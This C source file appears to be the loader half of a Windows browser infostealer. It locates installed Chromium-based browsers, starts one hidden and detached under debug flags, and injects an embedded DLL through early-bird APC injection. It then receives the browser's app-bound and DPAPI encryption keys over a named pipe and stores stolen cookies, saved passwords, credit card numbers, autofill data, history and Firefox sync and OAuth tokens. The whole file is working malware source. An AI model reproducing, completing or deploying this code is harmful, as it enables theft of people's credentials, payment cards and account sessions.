#include "Headers.h"
#include "Resource.h"

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL ProcessDataPacket(IN PCHROMIUM_DATA pChromiumData, IN PBYTE pbData, IN DWORD cbData)
{
    PDATA_PACKET    pPacket     = (PDATA_PACKET)pbData;
    PBYTE*          ppKey       = NULL;
    PDWORD          pdwKeyLen   = NULL;

    if (!pChromiumData || !pbData || cbData < sizeof(DATA_PACKET))
        return FALSE;

    switch (pPacket->dwSignature)
    {
        case PACKET_SIG_APP_BOUND_KEY:
            ppKey       = &pChromiumData->pbAppBoundKey;
            pdwKeyLen   = &pChromiumData->dwAppBoundKeyLen;
            break;

        case PACKET_SIG_DPAPI_KEY:
            ppKey       = &pChromiumData->pbDpapiKey;
            pdwKeyLen   = &pChromiumData->dwDpapiKeyLen;
            break;

        default:
            return FALSE;
    }

    if (pPacket->dwDataSize == 0)
        return FALSE;

    HEAP_FREE_SECURE(*ppKey, *pdwKeyLen);

    if (!(*ppKey = DuplicateBuffer(pPacket->bData, pPacket->dwDataSize)))
        return FALSE;

    *pdwKeyLen = pPacket->dwDataSize;
    return TRUE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL InitializeChromiumData(IN OUT PCHROMIUM_DATA pChromiumData)
{
    if (!pChromiumData)
        return FALSE;

    RtlSecureZeroMemory(pChromiumData, sizeof(CHROMIUM_DATA));

    pChromiumData->dwTokenCapacity      = INITIAL_ARRAY_CAPACITY;
    pChromiumData->dwCookieCapacity     = INITIAL_ARRAY_CAPACITY;
    pChromiumData->dwLoginCapacity      = INITIAL_ARRAY_CAPACITY;
    pChromiumData->dwCreditCardCapacity = INITIAL_ARRAY_CAPACITY;
    pChromiumData->dwAutofillCapacity   = INITIAL_ARRAY_CAPACITY;
    pChromiumData->dwHistoryCapacity    = INITIAL_ARRAY_CAPACITY;
    pChromiumData->dwBookmarkCapacity   = INITIAL_ARRAY_CAPACITY;

    if (!(pChromiumData->pTokens = (PTOKEN_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(TOKEN_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromiumData->pCookies = (PCOOKIE_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COOKIE_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromiumData->pLogins = (PLOGIN_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(LOGIN_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromiumData->pCreditCards = (PCREDIT_CARD_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(CREDIT_CARD_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromiumData->pAutofill = (PAUTOFILL_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(AUTOFILL_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromiumData->pHistory = (PHISTORY_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(HISTORY_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    if (!(pChromiumData->pBookmarks = (PBOOKMARK_ENTRY)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(BOOKMARK_ENTRY) * INITIAL_ARRAY_CAPACITY)))
        return FALSE;

    return TRUE;
}

VOID FreeChromiumData(IN OUT PCHROMIUM_DATA pChromiumData)
{
    if (!pChromiumData)
        return;

    HEAP_FREE_SECURE(pChromiumData->pbAppBoundKey, pChromiumData->dwAppBoundKeyLen);
    HEAP_FREE_SECURE(pChromiumData->pbDpapiKey, pChromiumData->dwDpapiKeyLen);

    if (pChromiumData->pTokens)
    {
        for (DWORD i = 0; i < pChromiumData->dwTokenCount; i++)
        {
            HEAP_FREE(pChromiumData->pTokens[i].pszService);
            HEAP_FREE_SECURE(pChromiumData->pTokens[i].pbToken, pChromiumData->pTokens[i].dwTokenLen);
            HEAP_FREE_SECURE(pChromiumData->pTokens[i].pbBindKey, pChromiumData->pTokens[i].dwBindKeyLen);
        }
        HEAP_FREE(pChromiumData->pTokens);
    }

    if (pChromiumData->pCookies)
    {
        for (DWORD i = 0; i < pChromiumData->dwCookieCount; i++)
        {
            HEAP_FREE(pChromiumData->pCookies[i].pszHostKey);
            HEAP_FREE(pChromiumData->pCookies[i].pszPath);
            HEAP_FREE(pChromiumData->pCookies[i].pszName);
            HEAP_FREE_SECURE(pChromiumData->pCookies[i].pbValue, pChromiumData->pCookies[i].dwValueLen);
        }
        HEAP_FREE(pChromiumData->pCookies);
    }

    if (pChromiumData->pLogins)
    {
        for (DWORD i = 0; i < pChromiumData->dwLoginCount; i++)
        {
            HEAP_FREE(pChromiumData->pLogins[i].pszOriginUrl);
            HEAP_FREE(pChromiumData->pLogins[i].pszActionUrl);
            HEAP_FREE(pChromiumData->pLogins[i].pszUsername);
            HEAP_FREE_SECURE(pChromiumData->pLogins[i].pbPassword, pChromiumData->pLogins[i].dwPasswordLen);
        }
        HEAP_FREE(pChromiumData->pLogins);
    }

    if (pChromiumData->pCreditCards)
    {
        for (DWORD i = 0; i < pChromiumData->dwCreditCardCount; i++)
        {
            HEAP_FREE(pChromiumData->pCreditCards[i].pszNameOnCard);
            HEAP_FREE(pChromiumData->pCreditCards[i].pszNickname);
            HEAP_FREE_SECURE(pChromiumData->pCreditCards[i].pbCardNumber, pChromiumData->pCreditCards[i].dwCardNumberLen);
        }
        HEAP_FREE(pChromiumData->pCreditCards);
    }

    if (pChromiumData->pAutofill)
    {
        for (DWORD i = 0; i < pChromiumData->dwAutofillCount; i++)
        {
            HEAP_FREE(pChromiumData->pAutofill[i].pszName);
            HEAP_FREE(pChromiumData->pAutofill[i].pszValue);
        }
        HEAP_FREE(pChromiumData->pAutofill);
    }

    if (pChromiumData->pHistory)
    {
        for (DWORD i = 0; i < pChromiumData->dwHistoryCount; i++)
        {
            HEAP_FREE(pChromiumData->pHistory[i].pszUrl);
            HEAP_FREE(pChromiumData->pHistory[i].pszTitle);
        }
        HEAP_FREE(pChromiumData->pHistory);
    }

    if (pChromiumData->pBookmarks)
    {
        for (DWORD i = 0; i < pChromiumData->dwBookmarkCount; i++)
        {
            HEAP_FREE(pChromiumData->pBookmarks[i].pszName);
            HEAP_FREE(pChromiumData->pBookmarks[i].pszUrl);
        }
        HEAP_FREE(pChromiumData->pBookmarks);
    }

    if (pChromiumData->pFireFoxBrsrData)
    {
        HEAP_FREE_SECURE(pChromiumData->pFireFoxBrsrData->pbMasterKey, pChromiumData->pFireFoxBrsrData->dwMasterKeyLen);
        HEAP_FREE(pChromiumData->pFireFoxBrsrData->szEmail);
        HEAP_FREE(pChromiumData->pFireFoxBrsrData->szUid);
        HEAP_FREE_SECURE(pChromiumData->pFireFoxBrsrData->szSessionToken, pChromiumData->pFireFoxBrsrData->szSessionToken ? lstrlenA(pChromiumData->pFireFoxBrsrData->szSessionToken) : 0);
        HEAP_FREE_SECURE(pChromiumData->pFireFoxBrsrData->szSyncOAuthToken, pChromiumData->pFireFoxBrsrData->szSyncOAuthToken ? lstrlenA(pChromiumData->pFireFoxBrsrData->szSyncOAuthToken) : 0);
        HEAP_FREE_SECURE(pChromiumData->pFireFoxBrsrData->szProfileOAuthToken, pChromiumData->pFireFoxBrsrData->szProfileOAuthToken ? lstrlenA(pChromiumData->pFireFoxBrsrData->szProfileOAuthToken) : 0);
        HEAP_FREE_SECURE(pChromiumData->pFireFoxBrsrData->szSendTabPrivateKey, pChromiumData->pFireFoxBrsrData->szSendTabPrivateKey ? lstrlenA(pChromiumData->pFireFoxBrsrData->szSendTabPrivateKey) : 0);
        HEAP_FREE_SECURE(pChromiumData->pFireFoxBrsrData->szCloseTabPrivateKey, pChromiumData->pFireFoxBrsrData->szCloseTabPrivateKey ? lstrlenA(pChromiumData->pFireFoxBrsrData->szCloseTabPrivateKey) : 0);
        HEAP_FREE(pChromiumData->pFireFoxBrsrData);
    }

    RtlSecureZeroMemory(pChromiumData, sizeof(CHROMIUM_DATA));
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

typedef struct _PIPE_THREAD_CONTEXT
{
    HANDLE          hPipe;
    PCHROMIUM_DATA  pChromiumData;
} PIPE_THREAD_CONTEXT, * PPIPE_THREAD_CONTEXT;

static BOOL IsPacketSignature(DWORD dwValue)
{
    return (dwValue == PACKET_SIG_APP_BOUND_KEY || dwValue == PACKET_SIG_DPAPI_KEY);
}

static DWORD WINAPI PipeReaderThread(IN LPVOID lpParam)
{
    PPIPE_THREAD_CONTEXT    pContext            = (PPIPE_THREAD_CONTEXT)lpParam;
    HANDLE                  hPipe               = pContext->hPipe;
    PCHROMIUM_DATA          pChromiumData       = pContext->pChromiumData;
    PBYTE                   pbBuf               = NULL,
                            pbAccumulator       = NULL;
    DWORD                   dwAccumSize         = 0x00,
                            dwAccumCapacity     = BUFFER_SIZE_8192 * 4,
                            dwReadBytes         = 0x00,
                            dwOffset            = 0x00;

    if (!(pbBuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, BUFFER_SIZE_8192)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(pbAccumulator = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwAccumCapacity)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED)
    {
        printf("[!] ConnectNamedPipe Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    printf("[+] DLL Connected To Pipe:\n\n");

    while (ReadFile(hPipe, pbBuf, BUFFER_SIZE_8192, &dwReadBytes, NULL) && dwReadBytes > 0)
    {
        // Expand accumulator if needed
        if (dwAccumSize + dwReadBytes > dwAccumCapacity)
        {
#define GROWTH_FACTOR 2
            DWORD   dwNewCapacity   = dwAccumCapacity * GROWTH_FACTOR;
            PBYTE   pbNewAccum      = NULL;
#undef GROWTH_FACTOR

            if (!(pbNewAccum = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNewCapacity)))
            {
                printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
                break;
            }

            RtlCopyMemory(pbNewAccum, pbAccumulator, dwAccumSize);
            HEAP_FREE(pbAccumulator);

            pbAccumulator   = pbNewAccum;
            dwAccumCapacity = dwNewCapacity;
        }

        // Append new data to accumulator
        RtlCopyMemory(pbAccumulator + dwAccumSize, pbBuf, dwReadBytes);
        dwAccumSize += dwReadBytes;


        while (dwOffset < dwAccumSize)
        {
            PDATA_PACKET    pPacket         = NULL;
            DWORD           dwPacketSize    = 0x00,
                            dwSignature     = 0x00,
                            dwTextStart     = 0x00;

            // Check if we have enough bytes for a potential signature
            if (dwOffset + sizeof(DWORD) <= dwAccumSize)
            {
                dwSignature = *(PDWORD)(pbAccumulator + dwOffset);

                if (IsPacketSignature(dwSignature))
                {
                    // Check if we have enough for packet header
                    if (dwOffset + sizeof(DATA_PACKET) > dwAccumSize) break;

                    pPacket         = (PDATA_PACKET)(pbAccumulator + dwOffset);
                    dwPacketSize    = sizeof(DATA_PACKET) + pPacket->dwDataSize;

                    // Check if we have complete packet
                    if (dwOffset + dwPacketSize > dwAccumSize) break;

                    // Process complete packet
                    ProcessDataPacket(pChromiumData, pbAccumulator + dwOffset, dwPacketSize);
                    dwOffset += dwPacketSize;
                    continue;
                }
            }

            // Not a packet signature
            dwTextStart = dwOffset;

            while (dwOffset < dwAccumSize)
            {
                if (dwOffset + sizeof(DWORD) <= dwAccumSize)
                {
                    dwSignature = *(PDWORD)(pbAccumulator + dwOffset);

                    if (IsPacketSignature(dwSignature))
                        break;
                }
                dwOffset++;
            }

            // Print text portion
            if (dwOffset > dwTextStart)
                printf("%.*s", dwOffset - dwTextStart, (LPSTR)(pbAccumulator + dwTextStart));
        }

        // Move unprocessed data to beginning of accumulator
        if (dwOffset < dwAccumSize)
        {
            RtlMoveMemory(pbAccumulator, pbAccumulator + dwOffset, dwAccumSize - dwOffset);
            dwAccumSize -= dwOffset;
        }
        else
        {
            dwAccumSize = 0x00;
        }

        dwOffset = 0x00;
    }

    // Print any remaining text
    if (dwAccumSize > 0)
        printf("%.*s", dwAccumSize, (LPSTR)pbAccumulator);

_END_OF_FUNC:
    HEAP_FREE(pbBuf);
    HEAP_FREE(pbAccumulator);
    if (hPipe)
        CloseHandle(hPipe);
    return 0;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

static BOOL CreateAlertableProcess(IN LPWSTR szProcessPath, IN OPTIONAL LPWSTR szArguments, OUT PROCESS_INFORMATION* pProcessInfo)
{
    STARTUPINFOW            StartupInfoW            = { .cb = sizeof(STARTUPINFOW) };
    SECURITY_ATTRIBUTES     SecurityAttribute       = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    LPWSTR                  szCmdLine               = NULL;
    SIZE_T                  cbCmdLine               = 0x00;
    HANDLE                  hNul                    = INVALID_HANDLE_VALUE;

    if (!szProcessPath || !pProcessInfo) return FALSE;

    RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));

    cbCmdLine = (lstrlenW(szProcessPath) + 3) * sizeof(WCHAR); 
    if (szArguments) cbCmdLine += (lstrlenW(szArguments) + 1) * sizeof(WCHAR);

    if (!(szCmdLine = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbCmdLine)))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (szArguments)
    {
        if (FAILED(StringCbPrintfW(szCmdLine, cbCmdLine, L"\"%s\" %s", szProcessPath, szArguments)))
        {
            printf("[!] StringCbPrintfW Failed\n");
            goto _END_OF_FUNC;
        }
    }
    else
    {
        if (FAILED(StringCbPrintfW(szCmdLine, cbCmdLine, L"\"%s\"", szProcessPath)))
        {
            printf("[!] StringCbPrintfW Failed\n");
            goto _END_OF_FUNC;
        }
    }

    // Redirect stderr to NUL to suppress browser debug output
    if ((hNul = CreateFileW(L"NUL", GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, &SecurityAttribute, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
    {
        StartupInfoW.dwFlags    = STARTF_USESTDHANDLES;
        StartupInfoW.hStdInput  = NULL;
        StartupInfoW.hStdOutput = hNul;
        StartupInfoW.hStdError  = hNul;
    }

    if (!CreateProcessW(NULL, szCmdLine, NULL, NULL, TRUE, (DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW | DETACHED_PROCESS), NULL, NULL, &StartupInfoW, pProcessInfo))
    {
        printf("[!] CreateProcessW Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

_END_OF_FUNC:
    if (hNul != INVALID_HANDLE_VALUE)
        CloseHandle(hNul);
    HEAP_FREE(szCmdLine);
    return pProcessInfo->hProcess ? TRUE : FALSE;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL GetBrowserPath(IN BROWSER_TYPE Browser, IN OUT LPWSTR szBrowserPath, IN DWORD dwSize)
{
    HRESULT hResult     = S_OK;
    HKEY    hKey        = NULL;
    DWORD   dwPathLen   = dwSize,
            dwType      = REG_SZ,
            dwDataSize  = dwSize * sizeof(WCHAR);
    LSTATUS STATUS      = 0x00;
    LPCWSTR szProgId    = NULL;
    LPCWSTR szRegKey    = NULL;

    if (!szBrowserPath || dwSize == 0 || Browser == BROWSER_UNKNOWN)
        return FALSE;

    szProgId = GetBrowserProgId(Browser);
    szRegKey = GetBrowserRegKey(Browser);

    // Try AssocQueryString first (works for all browsers)
    if (szProgId)
    {
        dwPathLen = dwSize;
        if (SUCCEEDED((hResult = AssocQueryStringW(ASSOCF_NONE, ASSOCSTR_EXECUTABLE, szProgId, L"open", szBrowserPath, &dwPathLen))))
        {
            if (GetFileAttributesW(szBrowserPath) != INVALID_FILE_ATTRIBUTES)
                return TRUE;
        }
    }

    // For Opera and Vivaldi browsers, try HKEY_CURRENT_USER registry first
    if ((Browser == BROWSER_OPERA || Browser == BROWSER_OPERA_GX || Browser == BROWSER_VIVALDI) && szRegKey)
    {
        if ((STATUS = RegOpenKeyExW(HKEY_CURRENT_USER, szRegKey, 0, KEY_READ, &hKey)) == ERROR_SUCCESS)
        {
            if ((STATUS = RegQueryValueExW(hKey, NULL, NULL, &dwType, (LPBYTE)szBrowserPath, &dwDataSize)) == ERROR_SUCCESS)
            {
                RegCloseKey(hKey);
                if (GetFileAttributesW(szBrowserPath) != INVALID_FILE_ATTRIBUTES)
                    return TRUE;
            }
            else
            {
                RegCloseKey(hKey);
            }
        }

        // Fallback: Try known installation path

#define STR_OPERA_RELATIVE_PATH         L"Programs\\Opera\\opera.exe"
#define STR_OPERA_GX_RELATIVE_PATH      L"Programs\\Opera GX\\opera.exe"
#define STR_VIVALDI_RELATIVE_PATH       L"Vivaldi\\Application\\vivaldi.exe"

        WCHAR   szLocalAppData[MAX_PATH]    = { 0 };
        LPCWSTR szRelativePath              = NULL;

        if (Browser == BROWSER_OPERA) szRelativePath = STR_OPERA_RELATIVE_PATH;
        if (Browser == BROWSER_OPERA_GX) szRelativePath = STR_OPERA_GX_RELATIVE_PATH;
        if (Browser == BROWSER_VIVALDI) szRelativePath = STR_VIVALDI_RELATIVE_PATH;

        if (szRelativePath && GetEnvironmentVariableW(L"LOCALAPPDATA", szLocalAppData, MAX_PATH))
        {
            if (SUCCEEDED(StringCchPrintfW(szBrowserPath, dwSize, L"%s\\%s", szLocalAppData, szRelativePath)))
            {
                if (GetFileAttributesW(szBrowserPath) != INVALID_FILE_ATTRIBUTES)
                    return TRUE;
            }
        }

#undef STR_OPERA_RELATIVE_PATH 
#undef STR_OPERA_GX_RELATIVE_PATH 
#undef STR_VIVALDI_RELATIVE_PATH

        return FALSE;
    }

    // For other browsers, try HKEY_LOCAL_MACHINE registry
    if (!szRegKey) return FALSE;

    if ((STATUS = RegOpenKeyExW(HKEY_LOCAL_MACHINE, szRegKey, 0, KEY_READ, &hKey)) != ERROR_SUCCESS)
    {
        printf("[!] RegOpenKeyExW Failed With Error: %ld\n", STATUS);
        return FALSE;
    }

    if ((STATUS = RegQueryValueExW(hKey, NULL, NULL, &dwType, (LPBYTE)szBrowserPath, &dwDataSize)) != ERROR_SUCCESS)
    {
        printf("[!] RegQueryValueExW Failed With Error: %ld\n", STATUS);
        RegCloseKey(hKey);
        return FALSE;
    }

    RegCloseKey(hKey);

    if (GetFileAttributesW(szBrowserPath) == INVALID_FILE_ATTRIBUTES)
    {
        printf("[!] GetFileAttributesW Failed For '%ws' With Error: %lu\n", szBrowserPath, GetLastError());
        return FALSE;
    }

    return TRUE;
}

static BOOL ExtractDllFromResources(IN LPCWSTR szDestPath)
{
    HRSRC       hResInfo        = NULL;
    HGLOBAL     hResData        = NULL;
    PVOID       pResData        = NULL;
    DWORD       dwResSize       = 0;
    HANDLE      hFile           = INVALID_HANDLE_VALUE;
    DWORD       dwBytesWritten  = 0;
    BOOL        bResult         = FALSE;

    if (!szDestPath) return FALSE;

    if (!(hResInfo = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_EMBEDDED_DLL), RT_DLL_RESOURCE)))
    {
        printf("[!] FindResourceW Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (!(hResData = LoadResource(NULL, hResInfo)))
    {
        printf("[!] LoadResource Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(pResData = LockResource(hResData)))
    {
        printf("[!] LockResource Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((dwResSize = SizeofResource(NULL, hResInfo)) == 0)
    {
        printf("[!] SizeofResource Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if ((hFile = CreateFileW(szDestPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
    {
        printf("[!] CreateFileW Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!WriteFile(hFile, pResData, dwResSize, &dwBytesWritten, NULL) || dwBytesWritten != dwResSize)
    {
        printf("[!] WriteFile Failed With Error: %lu\n", GetLastError());
        printf("[i] Wrote %lu Of %lu\n", dwBytesWritten, dwResSize);
        goto _END_OF_FUNC;
    }

    printf("[+] Extracted DLL To '%ws' (%lu bytes)\n", szDestPath, dwResSize);
    bResult = TRUE;

_END_OF_FUNC:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    return bResult;
}


static BOOL GetDllPath(IN OUT LPWSTR szDllPathToBeInjected, IN DWORD dwSize)
{
    LPWSTR  szCurrentProgramPath    = NULL;
    LPWSTR  szLastSlash             = NULL;
    HANDLE  hResult                 = 0x00;
    BOOL    bResult                 = FALSE;

    if (!szDllPathToBeInjected || dwSize == 0) return FALSE;

    if (!(szCurrentProgramPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR))))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (!GetModuleFileNameW(NULL, szCurrentProgramPath, MAX_PATH))
    {
        printf("[!] GetModuleFileNameW Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!PathRemoveFileSpecW(szCurrentProgramPath))
    {
        printf("[!] PathRemoveFileSpecW Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (FAILED((hResult = StringCchPrintfW(szDllPathToBeInjected, dwSize, L"%s\\%s", szCurrentProgramPath, STR_DLL_NAME))))
    {
        printf("[!] StringCchPrintfW Failed With Error: 0x%0.8X\n", hResult);
        goto _END_OF_FUNC;
    }

    if (GetFileAttributesW(szDllPathToBeInjected) == INVALID_FILE_ATTRIBUTES)
    {
        printf("[!] GetFileAttributesW Failed For '%ws' With Error: %lu\n", szDllPathToBeInjected, GetLastError());
        printf("[i] DLL Not Found On Disk, Extracting From Resources...\n");

        if (!ExtractDllFromResources(szDllPathToBeInjected))
            goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    HEAP_FREE(szCurrentProgramPath);
    return bResult;
}

// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

BOOL InjectDllViaEarlyBird(IN BROWSER_TYPE Browser, IN OUT PCHROMIUM_DATA pChromiumData)
{
    PROCESS_INFORMATION     ProcessInfo                     = { 0 };
    PIPE_THREAD_CONTEXT     PipeContext                     = { 0 };
    CHAR                    szPipeName[BUFFER_SIZE_32]      = { 0 };
    HANDLE                  hPipe                           = NULL;
    HANDLE                  hPipeThread                     = NULL;
    LPVOID                  pRemoteDllPath                  = NULL;
    LPWSTR                  szDllPath                       = NULL;
    LPWSTR                  szBrowserPath                   = NULL;
    SIZE_T                  cbDllPathSize                   = 0x00;
    SIZE_T                  cbBytesWritten                  = 0x00;
    BOOL                    bResult                         = FALSE;

    if (!pChromiumData || Browser == BROWSER_UNKNOWN)
        return FALSE;

    if (!(szBrowserPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR))))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!(szDllPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH * sizeof(WCHAR))))
    {
        printf("[!] HeapAlloc Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!GetBrowserPath(Browser, szBrowserPath, MAX_PATH))
        goto _END_OF_FUNC;

    printf("[+] Found %s: %ws\n", GetBrowserName(Browser), szBrowserPath);

    if (!GetDllPath(szDllPath, MAX_PATH))
        goto _END_OF_FUNC;

    printf("[+] DLL Path: %ws\n", szDllPath);

    cbDllPathSize = (lstrlenW(szDllPath) + 1) * sizeof(WCHAR);

    GetPipeName(szPipeName, BUFFER_SIZE_32);

    if ((hPipe = CreateNamedPipeA(szPipeName, PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, BUFFER_SIZE_8192, BUFFER_SIZE_8192, 0, NULL)) == INVALID_HANDLE_VALUE)
    {
        printf("[!] CreateNamedPipeA Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    PipeContext.hPipe           = hPipe;
    PipeContext.pChromiumData   = pChromiumData;

    if (!(hPipeThread = CreateThread(NULL, 0x00, PipeReaderThread, &PipeContext, 0x00, NULL)))
    {
        printf("[!] CreateThread Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!CreateAlertableProcess(szBrowserPath, STR_CHROMIUM_ARGS, &ProcessInfo) || !ProcessInfo.hProcess)
        goto _END_OF_FUNC;

    printf("[+] Created %s Process With ID: %lu\n", GetBrowserName(Browser), ProcessInfo.dwProcessId);
    
    if (!(pRemoteDllPath = VirtualAllocEx(ProcessInfo.hProcess, NULL, cbDllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
    {
        printf("[!] VirtualAllocEx Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!WriteProcessMemory(ProcessInfo.hProcess, pRemoteDllPath, szDllPath, cbDllPathSize, &cbBytesWritten))
    {
        printf("[!] WriteProcessMemory Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!QueueUserAPC((PAPCFUNC)LoadLibraryW, ProcessInfo.hThread, (ULONG_PTR)pRemoteDllPath))
    {
        printf("[!] QueueUserAPC Failed With Error: %lu\n", GetLastError());
        goto _END_OF_FUNC;
    }

    if (!DebugActiveProcessStop(ProcessInfo.dwProcessId))
    {
        printf("[!] DebugActiveProcessStop Failed With Error: %d\n", GetLastError());
        goto _END_OF_FUNC;
    }

    printf("[+] Injection Complete! Waiting For DLL Output...\n");

    switch (WaitForSingleObject(hPipeThread, PIPE_THREAD_TIMEOUT))
    {
        case WAIT_TIMEOUT:
            printf("[!] Pipe Thread Timed Out\n\n");
        case WAIT_OBJECT_0:
            printf("[*] Pipe Connection Closed\n\n");
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (hPipeThread)
        CloseHandle(hPipeThread);
    if (ProcessInfo.hThread)
        CloseHandle(ProcessInfo.hThread);
    if (ProcessInfo.hProcess)
    {
        TerminateProcess(ProcessInfo.hProcess, 0x00);
        CloseHandle(ProcessInfo.hProcess);
    }
    HEAP_FREE(szDllPath);
    HEAP_FREE(szBrowserPath);
    
    return bResult;
}